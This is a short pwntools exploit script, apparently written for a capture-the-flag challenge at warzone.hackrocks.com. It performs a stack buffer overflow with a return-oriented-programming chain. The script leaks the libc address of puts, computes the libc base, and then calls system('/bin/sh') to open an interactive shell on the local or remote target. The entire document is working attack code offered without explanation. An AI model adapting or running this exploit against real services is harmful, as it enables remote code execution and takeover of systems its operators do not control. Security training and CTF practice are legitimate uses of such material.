from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

if args.REMOTE:
   libc = ELF('libc6_2.28-10+deb10u1_amd64.so',checksec=False)
else:
   libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('warzone.hackrocks.com',7770)
    else:
        return process(e.path)

p = start()

pad = cyclic(136)
pop_rdi = p64(r.find_gadget(['pop rdi','ret'])[0])
puts_got = p64(e.got['puts'])
puts_plt = p64(e.plt['puts'])
main = p64(e.sym['main'])

def leak_libc():
   chain =  pop_rdi
   chain += puts_got
   chain += puts_plt
   chain += main

   p.recvuntil(b'let\'s see what u got')
   p.recvline()
   p.sendline(pad+chain)
   leak=u64(p.recv(6)+b'\x00\x00')
   log.info("Libc Leak (puts): %s" %hex(leak))
   libc.address=leak-libc.sym['puts']
   log.info("Libc Address: %s" %hex(libc.address))

def call_system():
   chain = pop_rdi
   chain += p64(next(libc.search(b'/bin/sh\0')))
   chain += p64(libc.sym['system'])
   chain += main
   
   p.recvuntil(b'let\'s see what u got')
   p.recvline()
   p.sendline(pad+chain)

leak_libc()
call_system()
p.interactive()

